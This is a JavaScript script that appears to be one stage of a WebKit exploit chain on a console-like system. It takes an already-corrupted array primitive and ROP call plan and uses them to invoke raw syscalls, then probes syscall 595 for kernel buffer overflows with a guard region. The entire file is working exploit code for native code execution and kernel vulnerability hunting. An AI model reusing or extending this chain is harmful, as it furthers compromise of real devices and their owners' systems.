// Syscall 595 overflow probe, v2. v1 (0x200-byte buffer) crashed the
// WebProcess — 595(modHandle, bufAddr, bufLen) faults while
// 595(modHandle, 0, 0) succeeds. v2 uses a 0x1000-byte buffer (matching
// the size we pass as arg2) and a 0x400-byte guard, checking whether the
// larger buffer prevents the crash or produces a clean copyout. The
// position-encoded guard detects writes past bufLen. Read-only except
// for whatever 595 writes into the buffer itself.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !state.view || !state.array || !state.a || !state.ownedTypedView ||
      !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0] !== state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase) ||
      typeof native.wrappers.sys595 !== "number" ||
      typeof native.wrappers.dynlib_list !== "number")
    throw new Error("chain_or_wrappers_missing");
  var frame = native.frame;
  var address = native.frameAddress;
  var bufOff = 0x200, bufLen = 0x1000;
  var guardOff = bufOff + bufLen;
  var guardLen = 0x400;
  var regionEnd = guardOff + guardLen;
  if (regionEnd > frame.length)
    throw new Error("frame_region_too_small");
  var bufAddress = address + bufOff;
  var bufOrig = [];
  for (var b = 0; b < bufLen + guardLen; b++)
    bufOrig.push(frame[bufOff + b]);
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("595ofl2_preflight");
  // Get module handle from 592
  phase = "list_592";
  var listOff = 0x100;
  var listAddr = address + listOff;
  frame.fill(0, listOff, listOff + 0x400);
  var call592 = native.call("dynlib_list", [listAddr, 0x400]);
  var modHandle = (frame[listOff + 4]) | (frame[listOff + 5] << 8);
  if (modHandle === 0)
    modHandle = (frame[listOff + 8]) | (frame[listOff + 9] << 8);
  mark("595ofl2_mod_handle");
  // Arm: zero buffer + position-encoded guard
  phase = "arm";
  frame.fill(0, bufOff, bufOff + bufLen);
  for (var g = 0; g < guardLen; g++)
    frame[guardOff + g] = (g * 7 + 3) & 255;
  var guardArmed = [];
  for (var ga = 0; ga < guardLen; ga++)
    guardArmed.push(frame[guardOff + ga]);
  mark("595ofl2_armed");
  // Call: 595(modHandle, bufAddr, bufLen)
  phase = "call_595";
  mark("595ofl2_before_call");
  var call = native.call("sys595",
    [modHandle, bufAddress, bufLen, 0, 0, 0]);
  mark("595ofl2_after_call");
  var errno = (call.value === -1) ? native.readErrno() : null;
  // Measure
  phase = "measure";
  var bufChanged = false, bufHex = "";
  for (var bc = 0; bc < bufLen; bc++) {
    if (frame[bufOff + bc] !== 0) { bufChanged = true; break; }
  }
  if (bufChanged) {
    for (var bh = 0; bh < 64; bh++)
      bufHex += ("0" + frame[bufOff + bh].toString(16)).slice(-2);
  }
  var overflowExtent = 0, overflowFirst = -1;
  for (var gs = 0; gs < guardLen; gs++) {
    if (frame[guardOff + gs] !== guardArmed[gs]) {
      if (overflowFirst === -1) overflowFirst = gs;
      overflowExtent = gs - overflowFirst + 1;
    }
  }
  var overflowHex = "";
  if (overflowFirst !== -1) {
    var dumpStart = guardOff + overflowFirst;
    var dumpLen = Math.min(64, overflowExtent);
    for (var dh = 0; dh < dumpLen; dh++)
      overflowHex += ("0" + frame[dumpStart + dh]
        .toString(16)).slice(-2);
  }
  // Restore
  for (var rr = 0; rr < bufLen + guardLen; rr++)
    frame[bufOff + rr] = bufOrig[rr];
  var after = native.call("getpid", []);
  mark("595ofl2_done");
  result = { id: "syscall595_overflow_v2",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: { ret: call.value, errno: errno,
      mod_handle: modHandle,
      buf_changed: bufChanged, buf_hex: bufHex,
      overflow_extent: overflowExtent,
      overflow_first: overflowFirst,
      overflow_hex: overflowHex,
      pid_ok: after.value === before.value && after.high === 0 } };
} catch (error) {
  result = { id: "syscall595_overflow_v2", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
